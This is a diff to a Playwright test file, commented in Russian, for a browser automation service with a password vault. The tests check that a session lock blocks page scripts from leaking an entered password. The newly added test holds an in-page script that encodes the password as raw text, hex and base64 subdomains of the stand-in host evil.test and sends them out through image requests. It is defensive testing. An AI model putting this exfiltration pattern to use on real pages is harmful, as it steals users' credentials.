@@ -2,7 +2,7 @@ import { randomBytes } from 'node:crypto'
 import { createSocket } from 'node:dgram'
 import { mkdtempSync } from 'node:fs'
 import { createServer, type Server } from 'node:http'
-import { createServer as createNetServer, type AddressInfo } from 'node:net'
+import { createServer as createNetServer, type AddressInfo, type Socket } from 'node:net'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { Readable } from 'node:stream'
@@ -10,7 +10,7 @@ import { expect, test, type Page } from '@playwright/test'
 import { installNetworkGuard } from '../../src/guard/index.js'
 import { createProfiles } from '../../src/profiles/index.js'
 import { startBrowserService } from '../../src/service/start.js'
-import { loginVaultPath, openLoginVault } from '../../src/vault/index.js'
+import { createOutputFilter, loginVaultPath, openLoginVault } from '../../src/vault/index.js'
 import { refOf, type BrowserResult } from './helpers.js'
 
 // Скрипт на разрешённом сайте читает вписанный пароль и уносит его на чужой сайт запросом GET (картинка, fetch,
@@ -96,20 +96,33 @@ test('пароль на странице не уходит на чужой са�
 
     const login = await call('url', { url: `${siteUrl}/login` })
     expect(login).toMatchObject({ ok: true, title: 'Вход' })
-    // Пароль вписан, но страница пыталась унести его: действие сообщает об этом модели, как о любом запросе под замком.
-    expect(await call('fill-password', { entryId: entry.id, ref: refOf(login.snapshot, 'textbox', 'Пароль') })).toMatchObject({ ok: false, code: 'refused_leak' })
+    // Пароль вписан, но страница пыталась унести его: действие сообщает об этом модели, как о любом запросе под замком,
+    // и говорит, что пароль уже вписан, — повторять вход незачем.
+    expect(await call('fill-password', { entryId: entry.id, ref: refOf(login.snapshot, 'textbox', 'Пароль') })).toMatchObject({
+      ok: false,
+      code: 'refused_leak',
+      message: expect.stringContaining('пароль вписан, замок сеанса взведён'),
+    })
 
     await expect.poll(() => logs.filter((line) => line.includes('refused_leak')).length).toBeGreaterThanOrEqual(2)
     // Сокет мог бы прийти чуть позже запросов: ждём, пока страница точно успела попытаться.
     await call('read')
     expect(stolen).toEqual([])
 
+    // Попытки унести пароль — отдельным событием журнала: пароль в адресе и сокет на другой сайт.
+    await expect.poll(() => logs.filter((line) => line.includes('"event":"leak_attempt"')).join('\n')).toMatch(/пароль в адресе/)
+    expect(logs.filter((line) => line.includes('"event":"leak_attempt"')).join('\n')).toMatch(/WebSocket на другой сайт/)
+
     // Новая страница без пароля в DOM: сеанс заперт до конца, счётчик на чужом адресе не грузится. Действие
-    // проходит, в результате — подсказка, что вписать в extraOrigins; в журнале службы — причина отказа.
+    // проходит, в результате — сайт и подсказка владельцу, что вписать в extraOrigins; в журнале службы — то же.
+    // Безобидный счётчик попыткой утечки не считается.
+    const attempts = logs.filter((line) => line.includes('"event":"leak_attempt"')).length
     const cabinet = await call('url', { url: `${siteUrl}/cabinet` })
     expect(cabinet).toMatchObject({ ok: true, title: 'Кабинет' })
-    expect(cabinet.blocked).toContain(`${foreignUrl}: закрыт после входа паролем; нужен приложению — впишите в extraOrigins`)
-    await expect.poll(() => logs.some((line) => line.includes('/cabinet.gif') && line.includes('extraOrigins'))).toBe(true)
+    expect(cabinet.blocked).toContainEqual(expect.stringMatching(/^localhost: закрыт после входа паролем; .*extraOrigins/))
+    expect(JSON.stringify(cabinet.blocked)).not.toContain(new URL(foreignUrl).port)
+    await expect.poll(() => logs.some((line) => line.includes('"domain":"localhost"') && line.includes('extraOrigins'))).toBe(true)
+    expect(logs.filter((line) => line.includes('"event":"leak_attempt"'))).toHaveLength(attempts)
     expect(stolen).toEqual([])
     expect(innerHits).toEqual([])
   } finally {
@@ -178,6 +191,8 @@ test('окно того же сайта не уносит пароль: замо
 })
 
 // Дальше — настоящий профиль службы (createProfiles): тот же запуск Chromium, флаги и прокси выхода.
+const passwordFilter = createOutputFilter(() => [PASSWORD])
+
 async function lockedProfile(
   siteUrl: string,
   options: { dataDir?: string; extraOrigins?: string[]; reachableInternal?: string[]; log?: (event: Record<string, unknown>) => void } = {},
@@ -187,6 +202,7 @@ async function lockedProfile(
     policy: { allowedOrigins: [siteUrl], ...(options.extraOrigins ? { extraOrigins: options.extraOrigins } : {}), allowedMutations: [], profiles: [{ name: 'remontnik' }] },
     log: options.log ?? (() => {}),
     ...(options.reachableInternal ? { reachableInternal: options.reachableInternal } : {}),
+    passwordIn: (text) => passwordFilter.text(text) !== text,
   })
   const session = await profiles.get('remontnik')
   return { session, close: () => profiles.closeAll() }
@@ -399,13 +415,19 @@ function storageSite(extraUrl: string, foreignUrl: string): Server {
 
 async function extraSite() {
   const hits: string[] = []
+  const upgrades: string[] = []
   const server = createServer((request, response) => {
     hits.push(request.url ?? '')
     response.writeHead(200, { 'content-type': 'image/gif' }).end()
   })
+  // Сервер видит каждое рукопожатие WebSocket: так видно, дошёл ли сокет до стороннего адреса.
+  server.on('upgrade', (request, socket: Socket) => {
+    upgrades.push(request.url ?? '')
+    socket.destroy()
+  })
   // Сторонний адрес — `localhost` на своём порту: другой origin, чем сайт приложения на 127.0.0.1.
   const url = (await listen(server)).replace('127.0.0.1', 'localhost')
-  return { hits, url, close: () => server.close() }
+  return { hits, upgrades, url, close: () => server.close() }
 }
 
 test('пароль из localStorage не уходит со следующей страницы; адрес из extraOrigins грузится, чужой — нет', async () => {
@@ -427,10 +449,14 @@ test('пароль из localStorage не уходит со следующей �
     // Новый документ: пароля в DOM нет, но он лежит в хранилище.
     await session.page.goto(`${siteUrl}/cabinet`)
     await expect.poll(() => extra.hits).toEqual(['/logo.gif'])
-    const reasons = () => events.filter((event) => event.event === 'blocked' && event.code === 'refused_leak').map((event) => String(event.reason))
-    await expect.poll(() => reasons().length).toBeGreaterThanOrEqual(2)
-    // Причина понятна владельцу: какой адрес закрыт и куда его вписать, если он нужен приложению.
-    expect(reasons().every((reason) => reason.includes(foreignUrl) && reason.includes('extraOrigins'))).toBe(true)
+    const leaks = () => events.filter((event) => event.event === 'blocked' && event.code === 'refused_leak')
+    // Картинка и fetch на один сайт без адреса в причине — одна запись журнала.
+    await expect.poll(() => leaks().length).toBeGreaterThanOrEqual(1)
+    // Владелец видит сайт и куда его вписать, если он нужен приложению; адреса с паролем в журнале нет.
+    expect(leaks().every((event) => event.domain === 'localhost' && String(event.hint).includes('extraOrigins'))).toBe(true)
+    expect(JSON.stringify(events)).not.toContain(PASSWORD)
+    expect(JSON.stringify(events)).not.toContain(String(foreign.tcpPort))
+    await expect.poll(() => events.filter((event) => event.event === 'leak_attempt' && event.how === 'пароль в адресе').length).toBeGreaterThanOrEqual(1)
     expect(foreign.tcp).toEqual([])
   } finally {
     await close()
@@ -462,7 +488,7 @@ test('замок сеанса переживает перезапуск служ
     try {
       await second.session.page.goto(`${siteUrl}/cabinet`)
       await expect.poll(() => extra.hits).toContain('/logo.gif')
-      await expect.poll(() => (blocked.push(...second.session.takeBlocked().map((request) => request.code)), blocked.length)).toBeGreaterThanOrEqual(2)
+      await expect.poll(() => (blocked.push(...second.session.takeBlocked().map((request) => request.code)), blocked)).toContain('refused_leak')
       expect(foreign.tcp).toEqual([])
     } finally {
       await second.close()
@@ -471,5 +497,105 @@ test('замок сеанса переживает перезапуск служ
     site.close()
     foreign.close()
     extra.close()
+  }
+})
+
+test('после входа WebSocket — только к allowedOrigins: адрес из extraOrigins сокета не получает', async () => {
+  const extra = await extraSite()
+  const site = loginSite()
+  const siteUrl = await listen(site)
+  const events: Record<string, unknown>[] = []
+  const reachableInternal = [new URL(extra.url).host.replace('localhost', '127.0.0.1')]
+  const { session, close } = await lockedProfile(siteUrl, { extraOrigins: [extra.url], reachableInternal, log: (event) => events.push(event) })
+  const page = session.page
+  const socketUrl = extra.url.replace('http', 'ws')
+  const openSocket = (path: string) => page.evaluate((url) => void new WebSocket(url), `${socketUrl}${path}`)
+  try {
+    await page.goto(`${siteUrl}/login`)
+    // До входа сокет к extraOrigins доходит до сервера.
+    await openSocket('/early')
+    await expect.poll(() => extra.upgrades).toEqual(['/early'])
+    session.passwordFilled()
+
+    // После входа — нет: замок закрывает его ещё в браузере и пишет в журнал попытку утечки.
+    await openSocket('/late')
+    await expect.poll(() => events.filter((event) => event.event === 'leak_attempt' && event.how === 'WebSocket на другой сайт').length).toBeGreaterThanOrEqual(1)
+    // Подресурс с того же адреса по-прежнему грузится: extraOrigins — для них.
+    await page.evaluate((url) => void (new Image().src = `${url}/after.gif`), extra.url)
+    await expect.poll(() => extra.hits).toContain('/after.gif')
+    expect(extra.upgrades).toEqual(['/early'])
+  } finally {
+    await close()
+    site.close()
+    extra.close()
+  }
+})
+
+test('пароль в имени хоста не доходит ни до ответа модели, ни до журнала, ни до отчёта', async () => {
+  // Скрипт страницы кладёт пароль в поддомен — как есть и в кодировках — и в имя второго уровня. Запросы закрыты;
+  // владельцу остаётся сайт без поддоменов, а имя второго уровня с паролем вырезает фильтр службы.
+  const encode = `
+    const hex = (value) => [...new TextEncoder().encode(value)].map((byte) => byte.toString(16).padStart(2, '0')).join('')
+    const b64 = (value) => btoa(value).replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '')
+    const leak = (value, tag) => {
+      for (const label of [value, hex(value), b64(value)]) new Image().src = 'https://' + label + '.evil.test/' + tag + '.gif'
+      new Image().src = 'https://' + hex(value) + '.test/' + tag + '.gif'
+    }`
+  const site = createServer((request, response) => {
+    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
+    if (request.url === '/login') {
+      response.end(`<!doctype html><title>Вход</title><label>Пароль <input type="password" name="password"></label><script>${encode}
+        document.querySelector('input[type=password]').addEventListener('input', (event) => { localStorage.setItem('hidden', event.target.value); leak(event.target.value, 'login') })
+      </script>`)
+      return
+    }
+    response.end(`<!doctype html><title>Кабинет</title><script>${encode}
+      leak(localStorage.getItem('hidden') || 'пусто', 'cabinet')
+    </script>`)
+  })
+  const siteUrl = await listen(site)
+  const dataDir = mkdtempSync(join(tmpdir(), 'remontnik-browser-exfil-'))
+  const vaultKey = randomBytes(32)
+  const entry = await openLoginVault({ file: loginVaultPath(dataDir), key: vaultKey }).add({ site: siteUrl, login: 'owner', profile: 'remontnik' }, Readable.from([Buffer.from(PASSWORD)]))
+  const logs: string[] = []
+  const token = randomBytes(24).toString('hex')
+  const service = await startBrowserService({
+    token,
+    vaultKey,
+    dataDir,
+    policy: { allowedOrigins: [siteUrl], allowedMutations: [], profiles: [{ name: 'remontnik' }] },
+    listen: { host: '127.0.0.1', port: 0 },
+    live: null,
+    log: (line) => logs.push(line),
+  })
+  const call = async (command: string, body: Record<string, unknown> = {}): Promise<BrowserResult> => {
+    const response = await fetch(`${service.url}/v1/${command}`, {
+      method: 'POST',
+      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
+      body: JSON.stringify({ profile: 'remontnik', ...body }),
+    })
+    return (await response.json()) as BrowserResult
+  }
+  const bytes = Buffer.from(PASSWORD)
+  const forms = [PASSWORD, bytes.toString('hex'), bytes.toString('base64url'), bytes.toString('base64url').toLowerCase()]
+  const leaked = (text: string) => forms.filter((form) => text.includes(form))
+
+  try {
+    const login = await call('url', { url: `${siteUrl}/login` })
+    const filled = await call('fill-password', { entryId: entry.id, ref: refOf(login.snapshot, 'textbox', 'Пароль') })
+    expect(filled).toMatchObject({ ok: false, code: 'refused_leak', message: expect.stringContaining('пароль вписан, замок сеанса взведён') })
+    expect(JSON.stringify(filled)).not.toContain('evil')
+
+    const cabinet = await call('url', { url: `${siteUrl}/cabinet` })
+    expect(cabinet).toMatchObject({ ok: true, title: 'Кабинет' })
+    expect(cabinet.blocked).toContainEqual(expect.stringMatching(/^evil\.test: закрыт после входа паролем/))
+    expect(cabinet.blocked).toContainEqual(expect.stringMatching(/^\[пароль скрыт\]\.test: /))
+    expect(leaked(JSON.stringify([login, filled, cabinet]))).toEqual([])
+
+    await expect.poll(() => logs.filter((line) => line.includes('"event":"leak_attempt"') && line.includes('пароль в адресе')).length).toBeGreaterThanOrEqual(1)
+    expect(leaked(logs.join('\n'))).toEqual([])
+  } finally {
+    await service.close()
+    site.close()
   }
 })
